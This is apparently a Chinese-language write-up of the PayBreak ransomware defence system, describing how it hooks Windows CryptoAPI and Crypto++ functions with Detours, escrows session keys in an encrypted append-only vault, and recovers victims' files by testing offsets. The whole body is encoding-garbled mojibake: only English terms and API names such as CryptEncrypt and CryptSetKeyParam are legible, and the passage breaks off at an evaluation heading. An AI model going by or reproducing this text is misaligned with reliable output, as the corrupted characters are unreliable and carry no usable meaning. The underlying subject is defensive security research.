åŸºäºè¿™ä¸€ç‰¹å¾ï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡å¯¹ç°ä»£å‹’ç´¢è½¯ä»¶æ‰€é‡‡ç”¨çš„å¼ºå¤§åŠ å¯†æŠ€æœ¯çš„ç ´è§£ã€‚ Crypto Function Hookingå‹’ç´¢è½¯ä»¶çš„ä½œè€…éœ€è¦å®‰å…¨å¯é çš„ç°ä»£åŠ å¯†æŠ€æœ¯ï¼Œå› æ­¤ï¼Œå½“ä»Šçš„æ¶æ„è½¯ä»¶ä½œè€…å¯ä»¥é€‰æ‹©åŠ¨æ€é“¾æ¥ï¼ˆç³»ç»Ÿæä¾›çš„ï¼‰å¯†ç åº“ï¼Œä¹Ÿå¯ä»¥å°†å¤–éƒ¨åº“é™æ€é“¾æ¥åˆ°ä»–ä»¬çš„ä»£ç ä¸­ã€‚ PayBreakæ”¯æŒä¸¤ç§ç±»å‹çš„é“¾æ¥æ–¹å¼ï¼Œå¹¶é€šè¿‡å®ƒä»¬çš„åç§°å’Œåœ°å€è¯†åˆ«åŠ¨æ€é“¾æ¥åº“ä¸­çš„åŠ å¯†è¿‡ç¨‹ï¼Œè€Œé™æ€é“¾æ¥è¿‡ç¨‹åˆ™åŸºäºæ¨¡ç³Šå­—èŠ‚ç­¾åï¼ˆè¯‘è€…æ³¨ï¼šç–‘ä¼¼æ¨¡ç³Šå“ˆå¸Œç®—æ³•çš„åº”ç”¨ï¼‰è¿›è¡Œæ ‡è¯†ã€‚ç„¶ååœ¨è¿™äº›è¿‡ç¨‹çš„ä½ç½®ç”Ÿæˆhookã€‚Hookä»è¿™äº›åŠ å¯†è¿‡ç¨‹æ”¹å˜ç¨‹åºæ§åˆ¶æµï¼Œå¹¶å¯¼å‡ºä¼šè¯å¯†é’¥ä»¥åŠå¯¹ç§°åŠ å¯†æ–¹æ¡ˆçš„å…¶ä»–ä»»ä½•å‚æ•°ã€‚å¯¼å‡ºæ•°æ®åï¼Œç³»ç»Ÿå°†æ§åˆ¶æƒè¿”å›åˆ°åŸå§‹åŠ å¯†è¿‡ç¨‹ï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿›è¡Œã€‚ Key Vaultç”¨äºæ¢å¤å¯¹ç§°åŠ å¯†æ•°æ®çš„å¯†é’¥ææ–™å’Œç®—æ³•è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ä¸Šæ‰€è¿°ï¼Œä»hookè¿‡ç¨‹ä¸­æ¢å¤å¹¶æå–å¯¼å‡ºï¼‰å­˜å‚¨åœ¨å®‰å…¨åŠ å¯†çš„å¯†é’¥åº“ä¸­ã€‚ç”±äºå‹’ç´¢è½¯ä»¶å¯èƒ½ä»¥å¯†é’¥åº“ä¸ºç›®æ ‡ï¼Œæˆ‘ä»¬çš„å®ç°å°†è·å–çš„å¯†é’¥å­˜å‚¨åˆ°ä¸€ä¸ªAppend-Onlyçš„æ–‡ä»¶ä¸­ï¼Œä¸”è¯¥æ–‡ä»¶å—ç®¡ç†å‘˜æƒé™ä¿æŠ¤ã€‚åœ¨æˆ‘ä»¬çš„æµ‹è¯•ä¸­ï¼Œè¿™ç§å®Œæ•´æ€§æœºåˆ¶å·²ç»è¶³å¤Ÿã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨ç¬¬å…­èŠ‚ä¸­è®¨è®ºäº†è¿›ä¸€æ­¥çš„å…³é”®åº“å®Œæ•´æ€§æ”¹è¿›ã€‚ å¯†é’¥åº“çš„å†…å®¹ä½¿ç”¨ç”¨æˆ·çš„å…¬å…±å¯†é’¥å®‰å…¨åœ°åŠ å¯†ï¼Œç”±äºåœ¨å­˜å‚¨ä¹‹å‰å·²å¯¹å…¶è¿›è¡Œè¿‡åŠ å¯†ï¼Œæˆ‘ä»¬ç¡®ä¿å¯†é’¥åº“å¯¹ç”¨æˆ·è€Œè¨€æ˜¯å®‰å…¨çš„ã€‚ File Recoveryå‡å¦‚ç”¨æˆ·ä¸å¹¸æ„ŸæŸ“äº†å‹’ç´¢è½¯ä»¶ä¸”æ–‡ä»¶éƒ½è¢«åŠ å¯†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç”¨æˆ·çš„ç§é’¥skuè®¿é—®å¯†é’¥åº“ã€‚ PayBreakç”¨äºè®¿é—®åŠ å¯†è¢«å‹’ç´¢çš„æ–‡ä»¶æ—¶çš„å¯†é’¥å’Œç®—æ³•ä¿¡æ¯ã€‚ç®—æ³•è¯¦ç»†ä¿¡æ¯ç”¨äºé…ç½®ä¸åŠ å¯†æ—¶ç›¸åŒçš„å¯¹ç§°åŠ å¯†æ–¹æ¡ˆï¼Œå¹¶ä¸”ä½¿ç”¨ä¿å­˜çš„å¯†é’¥ä¸è¯¥é…ç½®ä¸€èµ·å°è¯•æ¢å¤æ–‡ä»¶ã€‚ å› ä¸ºå‹’ç´¢è½¯ä»¶é€šå¸¸ä¼šå­˜å‚¨å…ƒæ•°æ®ï¼Œä¾‹å¦‚åŸå§‹æ–‡ä»¶é•¿åº¦ï¼ŒåŠ å¯†æ—¥æœŸå’ŒåŠ å¯†å¯†é’¥æ•°æ®ç­‰ä¿¡æ¯ï¼Œæ‰€ä»¥åœ¨åŠ å¯†å¼€å§‹æ—¶ï¼Œå®é™…çš„åŠ å¯†æ–‡ä»¶æ•°æ®é€šå¸¸ä¼šåœ¨è¯¥å…ƒæ•°æ®çš„å›ºå®šåç§»å¤„ã€‚åœ¨è§£å¯†ä¹‹å‰ï¼ŒPayBreakå°†é€šè¿‡æµ‹è¯•ç¡®å®šåŠ å¯†æ–‡ä»¶çš„æ­£ç¡®åç§»ã€‚ è¯¦ç»†å®ç°æˆ‘ä»¬åœ¨Windows7ä¸Šå®ç°äº†åŸå‹ç³»ç»ŸPayBreakï¼Œä¸»è¦éƒ¨åˆ†ä¸ºHookç”±Microsoftçš„Crypto APIå’ŒCrypto++åº“æ‰§è¡Œçš„åŠ å¯†ã€‚è¯¥å®ç°è¿˜ä½¿ç”¨äº†å¾®è½¯CryptoAPIä¸­çš„åŠ å¯†æŠ€æœ¯æ¥å®‰å…¨åœ°å­˜å‚¨å‹’ç´¢è½¯ä»¶ä½¿ç”¨çš„ä¼šè¯å¯†é’¥ã€‚ Crypto Function HookingHookingæ˜¯ä¸€ç§é€šè¿‡ä½¿ç”¨ä»»æ„æ–°å‡½æ•°ä¿®æ”¹åŸå§‹å‡½æ•°æ¥æ”¹å˜åº”ç”¨ç¨‹åºè¡Œä¸ºçš„æŠ€æœ¯ã€‚åœ¨Windowsä¸­ï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ¥hookå‡½æ•°ï¼ŒèŒƒå›´ä»ä¿®æ”¹è¿›ç¨‹çš„â€œImport Address Tableâ€åˆ°æ³¨å…¥DLLã€‚æˆ‘ä»¬çš„åŸå‹ç³»ç»Ÿä½¿ç”¨Microsoft Researchçš„Detoursåº“è¿›è¡Œhookingã€‚Detoursé¦–å…ˆä»åŸå§‹å‡½æ•°çš„å†…å­˜åœ°å€çš„å¼€å¤´è‡³å°‘ä¿å­˜5ä¸ªå­—èŠ‚ï¼ˆx86æ±‡ç¼–ä¸­æ— æ¡ä»¶çš„JMPæŒ‡ä»¤çš„å¤§å°ï¼‰æ¥hookå‡½æ•°ã€‚ç”±äºx86ä½“ç³»ç»“æ„ä¸­çš„æŒ‡ä»¤é•¿åº¦å¯å˜ï¼Œä¿å­˜çš„å­—èŠ‚æ•°å¯èƒ½è¶…è¿‡5ä¸ªå­—èŠ‚ã€‚Hookå‡½æ•°è¿˜ä¼šåŒ…å«éœ€è¦æ·»åŠ çš„æ–°ä»£ç ï¼Œå¯¹PayBreakè€Œè¨€ï¼Œå°±æ˜¯å°†ä¼šè¯å¯†é’¥å’Œç®—æ³•å‚æ•°å¯¼å‡ºåˆ°å¯†é’¥åº“ã€‚åœ¨æ–°åˆ›å»ºçš„hookå‡½æ•°æœ«å°¾ï¼ŒDetoursä¼šåˆ›å»ºä¸€æ¡æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œå°†æ§åˆ¶æƒç§»å›åŸå§‹å‡½æ•°å¹¶è·³è¿‡hookå‡½æ•°ã€‚å³åœ¨æ¯ä¸ªå‡½æ•°çš„å‰5ä¸ªå­—èŠ‚ï¼ˆå¯èƒ½æ›´å¤šï¼‰æ”¾ä¸€ä¸ªjmpï¼Œè·³åˆ°hookå‡½æ•°ï¼Œhookå‡½æ•°ç»“å°¾å†jmpå›åŸæ§åˆ¶æµå¤„ã€‚ ä¸ºäº†æ¿€æ´»hookå¹¶å°†ç¨‹åºæ§åˆ¶æµä»åŸå§‹å‡½æ•°é‡å®šå‘åˆ°hookå‡½æ•°ï¼Œå¯¹hookå‡½æ•°çš„jmpå°†è¦†ç›–åŸå§‹å‡½æ•°ä¸­çš„å‰äº”ä¸ªå­—èŠ‚ã€‚è¿™æ ·å°±å®Œæˆäº†hookingï¼Œå¹¶ä¸”å¯¹åŸå§‹å‡½æ•°çš„æ‰€æœ‰è°ƒç”¨ç°åœ¨éƒ½å°†é‡å®šå‘åˆ°hookã€‚æˆ‘ä»¬çš„ç³»ç»Ÿé‡‡ç”¨æ­¤æ–¹æ¡ˆè¿›è¡Œhookingï¼Œå¹¶å°†å…¶è‡ªèº«æ’å…¥Windows 7è®¡ç®—æœºä¸Šå¯åŠ¨çš„æ¯ä¸ªæ–°è¿›ç¨‹ä¸­ã€‚ å‹’ç´¢è½¯ä»¶ä½œè€…ä¸€èˆ¬é€šè¿‡åŠ¨æ€é“¾æ¥åˆ°ç³»ç»Ÿæä¾›çš„åŠ å¯†åº“æˆ–é™æ€é“¾æ¥å¤–éƒ¨åº“ä»¥å°†åŠ å¯†æŠ€æœ¯çº³å…¥å…¶æ¶æ„è½¯ä»¶ä¸­ï¼Œè¿™ä¸¤ç§é“¾æ¥æ–¹å¼ç»™ç³»ç»Ÿçš„hookingå¸¦æ¥äº†ä¸åŒçš„å›°éš¾ã€‚ Hooking in dynamically linked librarieså‡ åå¹´æ¥ï¼ŒWindowsä¸€ç›´å°†åŠŸèƒ½ä¸°å¯Œçš„åŠ å¯†åº“ä½œä¸ºå…¶å¹³å°çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œä½¿å¾—æ¶æ„è½¯ä»¶å¾ˆå®¹æ˜“åŠ¨æ€é“¾æ¥åˆ°Windowsä¸Šçš„åŠ å¯†åº“ã€‚å¾®è½¯çš„CryptoAPIåªå…è®¸é€šè¿‡ä¸€ç»„å…·æœ‰ç‰¹æ®Šè®¿é—®æƒé™çš„å­ä¾‹ç¨‹è¿›è¡Œæ“ä½œï¼Œä»è€Œéšè—å¯†é’¥åŠå…¶åœ¨å†…å­˜ä¸­çš„ä½ç½®ç­‰æ•æ„Ÿä¿¡æ¯ã€‚CryptoAPIçš„å®‰å…¨æ€§ã€å¹³å°ä¸€è‡´æ€§å’ŒAPIå®Œæ•´æ€§ä½¿å…¶æˆä¸ºå‹’ç´¢è½¯ä»¶ä½œè€…è¿›è¡Œæœ¬åœ°æ–‡ä»¶åŠ å¯†çš„å¸¸ç”¨é€‰æ‹©ã€‚å¾®è½¯çš„CNGåº“æ˜¯ç»å…¸CryptoAPIçš„å¯é€‰æ›¿ä»£å“ï¼ˆä¸¤è€…éƒ½åŒ…å«åœ¨windows7ä¸­ï¼‰ï¼Œä½†ä½¿ç”¨æ–¹å¼åŸºæœ¬ç›¸åŒï¼ŒPayBreakä¹Ÿèƒ½æ— ç¼åˆ‡æ¢å¤„ç†ã€‚ ç”±äºCryptoAPIæŠ½è±¡å’Œä¸é€æ˜çš„è®¾è®¡ï¼Œä¼šè¯å¯†é’¥çš„ä½¿ç”¨å’Œå¯¼å‡ºåªèƒ½é€šè¿‡ç‰¹å®šçš„CryptoAPIè¿‡ç¨‹æ¥å®Œæˆã€‚é€šè¿‡CryptoAPIè¿›è¡Œçš„æ‰€æœ‰åŠ å¯†éƒ½å¿…é¡»é€šè¿‡CryptEncryptå‡½æ•°æ‰§è¡Œï¼Œæˆ–è€…å¿…é¡»é€šè¿‡CryptExportå‡½æ•°å¯¼å‡ºï¼ˆä¾›å¤–éƒ¨ä½¿ç”¨ï¼‰ã€‚åŸºäºCryptoAPIçš„å‹’ç´¢è½¯ä»¶ä½¿ç”¨CryptoAPIçš„CryptEncryptå‡½æ•°æ¥æ‰§è¡Œæ–‡ä»¶çš„æœ¬åœ°åŠ å¯†ã€‚å› ä¸ºCryptoAPIæ˜¯åŠ¨æ€é“¾æ¥çš„ï¼Œæ‰€ä»¥æ·»åŠ hookå®Œå…¨ç‹¬ç«‹äºè°ƒç”¨è¿‡ç¨‹ï¼Œå¹¶ä¸”æ¶æ„è½¯ä»¶çš„æ··æ·†ä¸ä¼šå½±å“æ­¤åŠŸèƒ½ã€‚åˆ©ç”¨åœ¨CryptEncryptä¸­é…ç½®çš„hookï¼ŒPayBreakå¯ä»¥ä½¿ç”¨CryptExport APIå‡½æ•°å®‰å…¨åœ°å¯¼å‡ºä¼šè¯å¯†é’¥ã€‚ è™½ç„¶CryptEncryptä¸­çš„hookå‡½æ•°æˆåŠŸå¯¼å‡ºäº†ä¼šè¯å¯†é’¥ï¼Œä½†å¹¶æœªåŒ…å«è¯¸å¦‚åŠ å¯†æ¨¡å¼å’Œåˆå§‹åŒ–å‘é‡ä¹‹ç±»çš„ç®—æ³•è¯¦ç»†ä¿¡æ¯ã€‚ä¸ºäº†è·å¾—è¿™äº›å‚æ•°ï¼Œç„¶åé‡æ–°æ¢å¤ç›¸åŒçš„åŠ å¯†é…ç½®ï¼Œæˆ‘ä»¬çš„ç³»ç»ŸæŒ‚æ¥äº†CryptAcquireContextå’ŒCryptSetKeyParamå‡½æ•°ã€‚CryptAcquireContextçš„hookå‡½æ•°ä¸ºPayBreakæä¾›äº†ç”¨äºåŠ å¯†çš„ç®—æ³•ä¿¡æ¯ï¼ŒåŒ…æ‹¬é»˜è®¤å‚æ•°ã€‚å¯¹è¿™äº›å‚æ•°çš„æ›´æ”¹æ˜¯ä½¿ç”¨CryptSetKeyParamå‡½æ•°æ‰§è¡Œçš„ï¼ŒåŒæ ·çš„æ­¤APIå‡½æ•°ä¹Ÿå·²è¢«hookingã€‚ é™¤äº†ä½¿ç”¨CryptoAPIè¿›è¡ŒåŠ å¯†ä¹‹å¤–ï¼Œç”¨æˆ·å¯èƒ½å¸Œæœ›ä½¿ç”¨APIæ¥ç”Ÿæˆå®‰å…¨çš„åŠ å¯†ç”¨éšæœºæ•°ï¼Œè€Œè¯¥éšæœºæ•°å¯ç”¨äºå¯¼å‡ºå¦ä¸€ä¸ªåŠ å¯†åŠŸèƒ½çš„ä¼šè¯å¯†é’¥ã€‚å°±Windowè€Œè¨€ï¼Œç”Ÿæˆéšæœºæ•°çš„å—æ”¯æŒçš„APIæ˜¯CryptGenRandomï¼Œè®¸å¤šåŠ å¯†åº“ï¼ˆå¦‚OpenSSLï¼ŒNaClï¼ŒLibTomCryptç­‰ï¼‰éƒ½åˆ©ç”¨æ­¤APIæ¥å®ç°å…¶åŠ å¯†å®‰å…¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰ã€‚é€šè¿‡åŠ¨æ€hookingå¹¶è®°å½•æ­¤ç³»ç»Ÿå‡½æ•°ï¼ŒPayBreakå­˜å‚¨ç”¨äºç”Ÿæˆè®¸å¤šä¼šè¯å¯†é’¥çš„åŸºç¡€ä¿¡æ¯ï¼Œè¿™äº›ä¼šè¯å¯†é’¥å°†åœ¨å‹’ç´¢è½¯ä»¶åŠ¨æ€æˆ–é™æ€é“¾æ¥è¿™äº›åº“æ—¶æ‰€ä½¿ç”¨ã€‚ Hooking in statically linked librariesé™æ€é“¾æ¥åŠ å¯†åº“çš„å‹’ç´¢è½¯ä»¶è¿«ä½¿PayBreaké‡‡ç”¨ç¨å¾®ä¸åŒçš„æ–¹æ³•ã€‚é™æ€é“¾æ¥çš„åº“åµŒå…¥åœ¨åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œä»£ç ä¸­ï¼Œä¼šå—åˆ°æ··æ·†çš„å½±å“ã€‚å› æ­¤ï¼ŒPayBreakä¼šåœ¨è¿è¡Œæ—¶ä»è¿›ç¨‹çš„å†…å­˜ä¸­è¯†åˆ«åŠ å¯†è¿‡ç¨‹ï¼Œç„¶åhookingã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿä½¿ç”¨32å­—èŠ‚çš„ fuzzy function signatures æ¥æ ‡è¯†é™æ€é“¾æ¥çš„åº“å‡½æ•°ã€‚è¿™ç§æ–¹æ³•ç±»ä¼¼äºIDAçš„å¿«é€Ÿåº“è¯†åˆ«å’Œè¯†åˆ«æŠ€æœ¯ï¼ˆFLIRTï¼‰ã€‚ ç­¾åç”±å·²çŸ¥åŠ å¯†è¿‡ç¨‹çš„å‰32ä¸ªå­—èŠ‚ç»„æˆï¼Œå½“åœ¨å†…å­˜ä¸­è¿ç»­è¯†åˆ«åˆ°è¿™32ä¸ªå­—èŠ‚ä¸”è¶…è¿‡é˜ˆå€¼ç™¾åˆ†æ¯”æ—¶ï¼Œç³»ç»Ÿå°†æ ‡è¯†è¯¥è¿›ç¨‹ã€‚å› ä¸ºé€šå¸¸æ¶æ„è½¯ä»¶ä¼šè¢«åŠ å£³ï¼Œæ‰€ä»¥PayBreakä¼šæ‰«ææ‰€æœ‰å·²æ‰§è¡Œè¿›ç¨‹çš„å¯æ‰§è¡Œå†…å­˜ï¼Œä»¥æŸ¥æ‰¾å‡½æ•°ç­¾åã€‚æˆ‘ä»¬çš„åŸå‹ç³»ç»Ÿå°†åœ¨æ¯ä¸ªè¿›ç¨‹ç¬¬ä¸€æ¬¡è°ƒç”¨NtReadFileä¹‹åæ‰§è¡Œæ‰«æï¼Œå› ä¸ºæ¶æ„è½¯ä»¶å¿…é¡»å…ˆè¯»å–æ•°æ®æ‰èƒ½åŠ å¯†ç”¨æˆ·æ–‡ä»¶ã€‚è¯†åˆ«åˆ°å‡½æ•°ç­¾ååï¼Œé€šè¿‡ä½¿ç”¨Detourså»hookå¹¶å¯¼å‡ºä¼šè¯å¯†é’¥å’ŒåŠ å¯†ç®—æ³•çš„è¯¦ç»†ä¿¡æ¯ã€‚å°½ç®¡æˆ‘ä»¬å½“å‰çš„åŸå‹ç³»ç»Ÿå¯ä»¥æœ‰æ•ˆæŠµå¾¡å½“ä»£å‹’ç´¢è½¯ä»¶ï¼Œä½†é«˜çº§åŠ å£³æŠ€æœ¯å’Œæ··æ·†ä»ç„¶å¯ä»¥ç»•è¿‡ä¿æŠ¤ç³»ç»Ÿã€‚å¯ä»¥åˆ©ç”¨å¯¹åŠ å¯†åŠŸèƒ½çš„è¯­ä¹‰æ£€æµ‹åŠ å¼ºå¯¹å‹’ç´¢è½¯ä»¶çš„è¯†åˆ«[2]ã€‚ æˆ‘ä»¬çš„åŸå‹ç³»ç»Ÿå®ç°å¸¦æœ‰Crypto++é™æ€é“¾æ¥åº“çš„ç­¾åï¼Œç”±Crypto++çš„SetKeyï¼ŒCipherModeBaseå’ŒSymmetricCipherBaseç±»æ–¹æ³•çš„å‰32ä¸ªå­—èŠ‚ç»„æˆï¼Œå¹¶é€šè¿‡CryptoAPIçš„CryptExport APIå‡½æ•°å¯¼å‡ºCrypto++ä¼šè¯å¯†é’¥å’Œç®—æ³•è¯¦ç»†ä¿¡æ¯ã€‚ Key Vaultæˆ‘ä»¬å‡è®¾Microsoft CryptoAPIå’ŒCrypto++ä½¿ç”¨çš„å¯¹ç§°å¯†é’¥å’Œæœ‰å…³å¯¹ç§°åŠ å¯†æ–¹æ¡ˆçš„è¯¦ç»†ä¿¡æ¯ä½¿ç”¨å®‰å…¨çš„æ–¹æ³•å­˜å‚¨ï¼Œåªæœ‰åœ¨å¿…è¦æ—¶æ‰èƒ½ç”±å‹’ç´¢è½¯ä»¶çš„å—å®³è€…è®¿é—®ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°PayBreakçš„å¯†é’¥åº“ç³»ç»Ÿçš„è®¾è®¡ä¸å‹’ç´¢è½¯ä»¶éƒ¨ç½²çš„æ··åˆå¯†ç ç³»ç»Ÿæå…¶ç›¸ä¼¼ï¼Œéƒ½ä½¿ç”¨ç³»ç»Ÿå®‰è£…è¿‡ç¨‹ä¸­ç”Ÿæˆçš„ç”¨æˆ·å…¬å…±å¯†é’¥ï¼ˆpkuï¼‰å¯¹ä¼šè¯å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œå¯¼å‡ºã€‚æˆ‘ä»¬çš„å®ç°ä¸ºæ­¤æ­¥éª¤ä½¿ç”¨çš„æ˜¯2048ä½RSAå¯†é’¥ï¼Œå¯ç¡®ä¿å¯¹å°äºæˆ–ç­‰äºå¯†é’¥å¤§å°çš„æ•°æ®è¿›è¡Œå®‰å…¨çš„åŠ å¯†-å¯¹äºä¸€èˆ¬çš„256ä½å¯¹ç§°å¯†é’¥è€Œè¨€å·²ç»è¶³å¤Ÿã€‚ å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼ŒCryptExcryptå‡½æ•°çš„è¡Œä¸ºå¢åŠ äº†å¯¹CryptEncryptçš„è°ƒç”¨ã€‚CryptExportè°ƒç”¨ä¼šå°†ä¼ é€’ç»™CryptEncryptå‡½æ•°çš„ä¼šè¯å¯†é’¥çš„å¥æŸ„ä»¥åŠæˆ‘ä»¬ç³»ç»Ÿçš„äº¤æ¢å¯†é’¥ï¼ˆå³ç”¨æˆ·çš„pkuï¼‰ä½œä¸ºå‚æ•°ä»¥å®‰å…¨åœ°å¯¼å‡ºä¼šè¯å¯†é’¥ï¼ŒåŒæ—¶CryptEncryptä¹Ÿä¼šå¯¼å‡ºä½¿ç”¨å¯†é’¥çš„ç®—æ³•ï¼ˆå³AESï¼Œ3DESï¼ŒRC4ç­‰ï¼‰ä¿¡æ¯ã€‚ æ­¤å¤–ï¼Œä¸ºäº†é‡å»ºå‹’ç´¢è½¯ä»¶æ„ŸæŸ“æ‰€ä½¿ç”¨çš„å¯¹ç§°åŠ å¯†é…ç½®ï¼Œæˆ‘ä»¬å¿…é¡»ä¿å­˜ç®—æ³•å‚æ•°ï¼Œä¾‹å¦‚åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰å’Œä½¿ç”¨çš„åˆ†ç»„å¯†ç æ¨¡å¼ç­‰ï¼Œè¿™äº›ä¿¡æ¯éƒ½æ˜¯ä»hookä¸­æå–çš„ã€‚Hookå¯¹ä¼ é€’ç»™CryptAcquireContextå’ŒCryptSetKeyParamå‡½æ•°çš„å‚æ•°è¿›è¡Œè®°å½•ã€‚ä¸åŠ å¯†æ¶ˆæ¯è¯­æ³•[3]ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒä»¬çš„å…¬å¼€ä¸ä¼šå½±å“ç°ä»£å¯†ç ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œæ‰€ä»¥è¿™äº›å‚æ•°ä»¥æ˜æ–‡å½¢å¼è¿æ¥åˆ°ä¼šè¯å¯†é’¥ä¿¡æ¯ã€‚æ­¤ä¸²è”çš„â€œblobâ€è¢«é™„åŠ åˆ°PayBreakçš„å¯†é’¥åº“ä¸­ã€‚æ­¤å¤–ï¼Œå¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬çš„åŸå‹å®ç°å°†ä¼ é€’ç»™Crypto++å‡½æ•°çš„åŠ å¯†å¯†é’¥ä¿¡æ¯ï¼ˆç®€å•å­—èŠ‚æ•°ç»„ï¼‰å­˜å‚¨åˆ°å¯†é’¥åº“ä¸­ã€‚ç³»ç»Ÿè¿˜å­˜å‚¨ä»CryptGenRandomå‡½æ•°è°ƒç”¨çš„å¯ç”¨äºé€†å‘å‹’ç´¢è½¯ä»¶ä»¥é‡æ–°åˆ›å»ºç”¨äºåŠ å¯†æ–‡ä»¶çš„ä¼šè¯å¯†é’¥è¾“å‡ºçš„éšæœºå­—èŠ‚ã€‚ ä¸ºå®‰å…¨èµ·è§ï¼Œé˜²æ­¢æ–‡ä»¶åº“æœ¬èº«è¢«å‹’ç´¢è½¯ä»¶åŠ å¯†ï¼Œæ–‡ä»¶åº“é…ç½®ä¸ºappend-onlyï¼Œå¹¶ä¸”ä»…å…è®¸Windows Administratorç»„è¿›è¡Œæ‰€æœ‰å…¶ä»–è®¿é—®ã€‚å¦‚æœå¯†é’¥åº“éœ€è¦è®¿é—®ï¼Œåˆ™ä½¿ç”¨åœ¨å®‰è£…PayBreakæœŸé—´è®¾ç½®çš„ç§é’¥ï¼ˆskuï¼‰æ¥è§£å¯†å­˜å‚¨çš„å¯†é’¥ææ–™ï¼Œä»è€Œè®¿é—®å„ä¸ªä¼šè¯å¯†é’¥å’ŒåŠ å¯†æ–¹æ¡ˆçš„å‚æ•°ã€‚ File RecoveryPayBreakçš„æœ€åä¸€ä¸ªç»„æˆéƒ¨åˆ†æ˜¯å‹’ç´¢è½¯ä»¶æ„ŸæŸ“æœŸé—´åŠ å¯†çš„æ–‡ä»¶çš„æ¢å¤ã€‚æ–‡ä»¶æ¢å¤åˆ†ä¸‰ä¸ªé˜¶æ®µè¿›è¡Œã€‚é¦–å…ˆä½¿ç”¨å­˜æ”¾çš„ç§é’¥è®¿é—®å¯†é’¥åº“ï¼Œç„¶åå°†ä¿ç®¡åº“ä¸­çš„æ•°æ®è§£æä¸ºå¯¹ç§°å¯†é’¥å’Œç›¸åº”çš„åŠ å¯†æ–¹æ¡ˆå‚æ•°ï¼Œä¾‹å¦‚å—å¯†ç æ¨¡å¼å’Œåˆå§‹åŒ–å‘é‡ï¼Œæœ€åæŠŠæ£€ç´¢åˆ°çš„ä¼šè¯å¯†é’¥ç”¨äºè§£å¯†å—å®³è€…çš„æ–‡ä»¶ã€‚é€šå¸¸ï¼Œç”±å‹’ç´¢è½¯ä»¶åŠ å¯†çš„æ¯ä¸ªæ–‡ä»¶éƒ½ä¸å…ƒæ•°æ®ï¼ˆä¾‹å¦‚å‹’ç´¢è½¯ä»¶ç‰ˆæœ¬å’ŒåŠ å¯†æ–‡ä»¶çš„åŸå§‹å¤§å°ï¼‰è¿æ¥åœ¨ä¸€èµ·ã€‚ç”±äºè¿™ç§å…ƒæ•°æ®ï¼Œå®é™…çš„åŠ å¯†æ–‡ä»¶æ•°æ®é€šå¸¸ä¼šåœ¨ä¸ºèµé‡‘è€Œä¿ç•™çš„æ–‡ä»¶ä¸­å‘ç”Ÿåç§»ã€‚åœ¨ä¸äº†è§£æ¯ä¸ªå‹’ç´¢è½¯ä»¶çš„å•ç‹¬å…ƒæ•°æ®ç»“æ„çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿè¢«è¿«å¯¹ä¿å­˜åœ¨å‹’ç´¢æ–‡ä»¶ä¸­çš„æ¯ä¸ªå¯èƒ½åç§»é‡è¿›è¡Œæµ‹è¯•ã€‚æˆ‘ä»¬çš„ç³»ç»Ÿåˆ©ç”¨åŠ¨æ€ç¼–è¯‘æ¥é™ä½åç»­æ–‡ä»¶è§£å¯†æ‰€éœ€çš„å·¥ä½œé‡ï¼Œä¸€æ—¦æ‰¾åˆ°æˆåŠŸçš„åç§»é‡ï¼Œä»¥åå°†åœ¨å…ˆå‰æˆåŠŸçš„åç§»é‡å¤„å°è¯•æ–‡ä»¶è§£å¯†ã€‚ PayBreakè¿­ä»£å°è¯•ä½¿ç”¨æ¯ä¸ªæ‰˜ç®¡å¯†é’¥å’Œæ¯ä¸ªåç§»é‡è§£å¯†æ–‡ä»¶ï¼Œç›´åˆ°è¾¾åˆ°è§£å¯†çŠ¶æ€ï¼ˆlibmagic[4]æœªå°†å…¶è¯†åˆ«ä¸ºâ€œdataâ€ï¼‰ä¸ºæ­¢ã€‚ ä¸€æ—¦å°†è§£å¯†çŠ¶æ€æ ‡è¯†ä¸ºå¸¸è§çš„Officeæ–‡æ¡£æ–‡ä»¶ç±»å‹ï¼Œä¾‹å¦‚Microsoft Wordæ–‡æ¡£ï¼ŒJPEGå›¾åƒæˆ–PDFæ–‡ä»¶ï¼Œè¯¥çŠ¶æ€å°†å¦å­˜ä¸ºå®é™…çš„è§£å¯†æ–‡ä»¶ã€‚ å½“ç„¶ï¼Œå¦‚æœç”Ÿæˆçš„æ–‡ä»¶è¢«é”™è¯¯åœ°æ ‡è®°ä¸ºå·²è§£å¯†ï¼Œåˆ™ç”¨æˆ·å¯ä»¥æŒ‡ç¤ºç³»ç»Ÿç»§ç»­æœç´¢ï¼Œç›´åˆ°æ ‡è¯†äº†æ­£ç¡®çš„é”®å’Œåç§»é‡ä¸ºæ­¢ã€‚æ­¤å¤–ï¼Œå°½ç®¡æˆ‘ä»¬å¯ä»¥æ”¹è¿›è¿™ç§æœªä¼˜åŒ–çš„æš´åŠ›ç ´è§£æ–¹æ³•ï¼Œä½†è‡³å°‘å®ƒæˆåŠŸåœ°æ¢å¤äº†æµ‹è¯•çš„åŠ å¯†ç”¨æˆ·æ–‡ä»¶ï¼Œæœ‰ç”¨å°±è¡Œä¸æ˜¯å—ã€‚ æµ‹è¯•è¯„ä¼°å¦‚ä¸Šä¸€èŠ‚æ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨Windows 7ä¸Šå®ç°äº†PayBreakã€‚ åŸºäºæ­¤åŸå‹å®ç°ï¼Œæˆ‘ä»¬å¯¹ç³»ç»Ÿè¿›è¡Œäº†æµ‹è¯•è¯„ä¼°å¹¶å›ç­”äº†ä»¥ä¸‹é—®é¢˜ï¼š RQ1 